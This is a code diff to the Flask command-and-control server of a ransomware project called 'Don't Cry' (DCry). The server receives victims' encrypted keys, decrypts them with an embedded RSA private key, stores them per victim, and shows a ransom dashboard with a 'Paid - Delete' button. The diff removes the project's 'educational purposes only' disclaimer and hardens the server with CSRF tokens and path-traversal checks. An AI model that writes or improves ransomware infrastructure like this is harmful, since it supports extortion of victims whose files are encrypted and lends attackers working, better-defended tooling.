@@ -1,19 +1,9 @@
-################################################################################
-#                             Don't Cry Ransomware                             #
-#                          ! EDUCATIONAL PURPOSES ONLY !                       #
-################################################################################
-# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
-# research, ethical hacking education, and malware analysis training only.
-# It mimics behavior of real ransomware but must NOT be used for illegal or
-# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
-# under supervision of cybersecurity professionals.
-# The authors assume no liability for any misuse or damage caused.
-
 import re
 import os
 import shutil
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
+from flask_wtf.csrf import CSRFProtect
 from datetime import datetime, timedelta
 from markupsafe import escape as flask_escape
 from flask import Flask, request, render_template_string, redirect, url_for
@@ -44,9 +34,12 @@ XUw55/7d4+kreY2rMonaItVYg7X5PgUCeHzqP4T86KSFs8xon5OD8qlS7lZ/WiAq
 ewKBiCUQmGSESlvfKEyGkR9h0ieCvM/8xh0WgNqWnLztWtEhF/fTMVkuqFxqrVbc
 QgNRtXbP/ulZU8c8xyiIW1O4urxsgEzXB5Fcf870D9g1THPoVCfnQQZNWt1Hblop
 rz9v0fKUbjGqZGd/5hMzmWL6Lg2AnsxBXSCjEqm1x6SFuJMMmkmOMkWwANY=
------END RSA PRIVATE KEY-----"""  # Replace with your private key if needed
+-----END RSA PRIVATE KEY-----""" # Replace with your private key if needed
 
 app = Flask(__name__)
+
+app.config['SECRET_KEY'] = 'dcry-ransomware-poc'
+csrf = CSRFProtect(app)
 
 VICTIM_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))
 
@@ -67,6 +60,12 @@ def sanitize_path_component(component):
         return "_"
     return component
 
+def is_safe_path(victim_id):
+    base_dir = os.path.abspath(VICTIM_FOLDER)
+    victim_path = os.path.join(base_dir, victim_id)
+    real_victim_path = os.path.abspath(victim_path)
+    return os.path.commonprefix([real_victim_path, base_dir]) == base_dir
+
 
 def victim_is_expired(date_str, days_valid=3):
     try:
@@ -77,7 +76,11 @@ def victim_is_expired(date_str, days_valid=3):
 
 
 def delete_victim(victim_id):
-    path = os.path.join(VICTIM_FOLDER, victim_id)
+    sanitized_id = sanitize_path_component(victim_id)
+    if not is_safe_path(sanitized_id):
+        app.logger.warning(f"Path Traversal attempt detected for deletion: {victim_id}")
+        return
+    path = os.path.join(VICTIM_FOLDER, sanitized_id)
     if os.path.isdir(path):
         shutil.rmtree(path)
 
@@ -85,25 +88,23 @@ def delete_victim(victim_id):
 @app.route("/upload", methods=["POST"])
 def upload():
     username = request.form.get("username", "")
-    vid = sanitize_path_component(request.form.get("id", ""))
+    vid_raw = request.form.get("id", "")
     date = request.form.get("date", "")
     key = request.form.get("key", "")
-
+    vid = sanitize_path_component(vid_raw)
     if not vid or vid == "_":
         return "Invalid victim ID.", 400
-
+    if not is_safe_path(vid):
+        return "Path Traversal attempt detected.", 400
     folder = os.path.join(VICTIM_FOLDER, vid)
     os.makedirs(folder, exist_ok=True)
-
     info_path = os.path.join(folder, "info.txt")
     with open(info_path, "w") as f:
         f.write(f"username={username}\n")
         f.write(f"date={date}\n")
-
     key_path = os.path.join(folder, "key.txt")
     with open(key_path, "w") as f:
         f.write(decrypt_key(key))
-
     return "Upload success."
 
 
@@ -112,6 +113,9 @@ def dashboard():
     victims_data = []
     try:
         for vid in os.listdir(VICTIM_FOLDER):
+            if not is_safe_path(vid):
+                continue
+
             vid_safe = sanitize_path_component(vid)
             if not vid_safe or vid_safe == "_":
                 continue
@@ -151,7 +155,6 @@ def dashboard():
                 continue
     except Exception as e:
         app.logger.error(f"Error listing victims: {e}")
-
     html = """
     <!DOCTYPE html>
     <html>
@@ -185,6 +188,8 @@ def dashboard():
                     <td><pre style="margin:0;">{{ v.key }}</pre></td>
                     <td>
                         <form method="post" action="{{ url_for('delete_victim_route') }}" onsubmit="return confirm('Delete victim {{ v.id }}?');">
+                            <!-- THAY ĐỔI: Thêm trường ẩn chứa token CSRF -->
+                            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
                             <input type="hidden" name="victim_id" value="{{ v.id }}">
                             <button type="submit">Paid - Delete</button>
                         </form>
@@ -196,17 +201,17 @@ def dashboard():
     </body>
     </html>
     """
-
     return render_template_string(html, victims=victims_data)
 
 
 @app.route("/delete_victim", methods=["POST"])
 def delete_victim_route():
-    victim_id_raw = request.form.get("victim_id")
-    victim_id = sanitize_path_component(victim_id_raw)
-    if not victim_id or victim_id == "_":
-        return "Invalid victim ID.", 400
-    delete_victim(victim_id)
+    victim_id = request.form.get("victim_id")
+    sanitized_id = sanitize_path_component(victim_id)
+    if not sanitized_id or sanitized_id == "_" or not is_safe_path(sanitized_id):
+        return "Invalid or unsafe victim ID.", 400
+        
+    delete_victim(sanitized_id)
     return redirect(url_for("dashboard"))
 
 
